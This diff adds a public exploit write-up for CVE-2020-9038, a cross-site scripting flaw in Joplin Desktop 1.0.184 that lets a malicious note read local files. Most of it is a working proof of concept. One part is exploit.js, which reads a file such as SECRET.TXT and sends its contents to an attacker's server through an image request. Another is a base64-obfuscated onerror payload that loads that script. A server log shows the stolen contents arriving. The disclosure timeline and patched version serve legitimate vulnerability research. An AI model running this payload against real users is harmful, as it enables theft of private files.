@@ -1,0 +1,76 @@
+# Exploit Title: Joplin Desktop 1.0.184 - Cross-Site Scripting
+# Exploit Author: Javier Olmedo
+# Date: 2020-02-27
+# Vendor: Laurent Cozic
+# Software Link: https://github.com/laurent22/joplin/archive/v1.0.184.zip
+# Affected Version: 1.0.184 and before
+# Patched Version: 1.0.185
+# Category: Remote
+# Platform: Windows
+# Tested on: Windows 10 Pro
+# CWE: https://cwe.mitre.org/data/definitions/79.html
+# CVE: 2020-9038
+# References:
+# https://github.com/JavierOlmedo/CVE-2020-9038
+# https://github.com/laurent22/joplin/commit/3db47b575b9cb0a765da3d283baa2c065df0d0bc
+ 
+# 1. Technical Description
+# Joplin Desktop version 1.0.184 and before are affected by Cross-Site Scripting
+# vulnerability through the malicious note. This allows a malicious user
+# read arbitrary files of system.
+ 
+# 2. Proof Of Concept (PoC)
+# 2.1 Start a webserver to receive the connection in evil machine (you can use a python server).
+
+python -m SimpleHTTPServer 8080
+
+# 2.2 Upload exploit.js file to your web server (Change your IP, PORT and USER)
+
+function readTextFile(file){
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function (){
+        if(rawFile.readyState === 4){
+            if(rawFile.status === 200 || rawFile.status == 0){
+                allText = rawFile.responseText;
+                //alert(allText);
+                var img = document.createElement('img');
+                img.src = "http://[IP:PORT]/" + allText;
+                document.body.appendChild(img)
+            }
+        }
+    }
+    rawFile.send(null);
+}
+readTextFile("file:///C:/Users/[USER]/Desktop/SECRET.TXT");
+//readTextFile("file:///C:/Windows/System32/drivers/etc/hosts");
+
+# 2.3 Create a secret.txt file with any content in victim desktop.
+
+# 2.4 Create a New note in Joplin Desktop and copy next payload in note body content (change your base64).
+
+<p><img src onerror=eval(atob("dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3J
+pcHQiKTtzY3JpcHQudHlwZT0idGV4dC9qYXZhc2NyaXB0IjtzY3JpcHQuc3JjPSJodHRwOi8vMTkyLjE2O
+C4xMDAuNjk6ODA4MC9leHBsb2l0LmpzIjtkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCI
+pWzBdLmFwcGVuZENoaWxkKHNjcmlwdCk="))></p>
+
+# 2.5 Your web server will receive a request with the contents of the secret.txt file
+
+Serving HTTP on 0.0.0.0 port 8080 ...
+192.168.100.250 - - [02/Feb/2020 08:27:22] "GET /exploit.js HTTP/1.1" 200 -
+192.168.100.250 - - [02/Feb/2020 08:27:27] "GET /?THIS%20IS%20A%20SECRET%20FILE HTTP/1.1" 200 -
+
+# 3. Timeline
+# 20, december 2019 - [RESEARCHER] Discover
+# 20, december 2019 - [RESEARCHER] Report to vendor support
+# 21, december 2019 - [DEVELOPER]  Recognized vulnerability
+# 13, february 2020 - [DEVELOPER]  Patched vulnerability
+# 27, february 2020 - [RESEARCHER] Public disclosure
+
+# 4. Disclaimer
+# The information contained in this notice is provided without any guarantee of use or otherwise.
+# The redistribution of this notice is explicitly permitted for insertion into vulnerability
+# databases, provided that it is not modified and due credit is granted to the author.
+# The author prohibits the malicious use of the information contained herein and accepts no responsibility.
+# All content (c)
+# Javier Olmedo
